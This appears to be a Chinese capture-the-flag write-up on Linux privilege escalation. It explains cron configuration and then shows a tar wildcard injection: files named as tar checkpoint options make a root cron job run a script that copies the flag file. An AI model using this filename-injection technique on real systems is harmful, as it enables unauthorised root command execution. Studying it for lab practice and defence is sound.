# 内网渗透与高级社工-权限提升维持-G3 WriteUp

本题考查cron定时任务。

## cron定时任务

/etc目录中有许多cron开头的目录或文件，cron配置文件由cron守护进程读取，并定时检查执行。

```
/etc/crontab
/etc/cron.d
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
```

`/etc/crontab`文件已说明了cron配置的格式：

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
```

*以上文件定义了：以root权限在每小时的17分执行/etc/cron.hourly目录下的所有脚本，在每天的6点25分执行/etc/cron.daily目录下的所有脚本，在每周的周日6点47分执行/etc/cron.weekly目录下的所有脚本，在每月的1号6点52分执行/etc/cron.monthly目录下的所有脚本。*

同时，/etc/cron.d目录下的文件也可以定义定时任务。

```
player@e5446d266649:/etc/cron.d$ ls
backup  e2scrub_all
player@e5446d266649:/etc/cron.d$ cat backup 
* * * * * root cd /var/backups/incoming && tar czf /var/backups/data.tar.gz * 2>/dev/null
```

以上文件定义了：以root权限在每分钟执行`cd /var/backups/incoming && tar czf /var/backups/data.tar.gz * 2>/dev/null`命令。

## 解题

由于`tar`命令是以root权限执行的，并在最后使用了通配符`*`，所以我们可以在`/var/backups/incoming`目录下创建一个恶意的文件，构建以`-`开头的文件名来假冒tar命令选项。

[tar命令用法](https://www.runoob.com/linux/linux-comm-tar.html)

tar命令的`-checkpoint`选项可以用来设置检查点（每多少个文件），`-checkpoint-action=exec='sh <COMMAND>'`选项可以在每个检查点执行指定的命令。

```bash
cd /var/backups/incoming
# 创建恶意文件，假冒tar选项
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec='sh shell.sh'"
# 创建shell脚本
echo 'cat /flag > /tmp/flag' > shell.sh
chmod +x shell.sh
```

如此一来拼接起来的命令就是：

```bash
tar czf /var/backups/data.tar.gz --checkpoint-action=exec='sh shell.sh' --checkpoint=1 shell.sh 2>/dev/null
```

root权限执行后，tar会打包shell.sh文件，在检查点时执行`sh shell.sh`，从而将`/flag`文件的内容写入到`/tmp/flag`中。

最终读取flag：

```bash
cat /tmp/flag
```
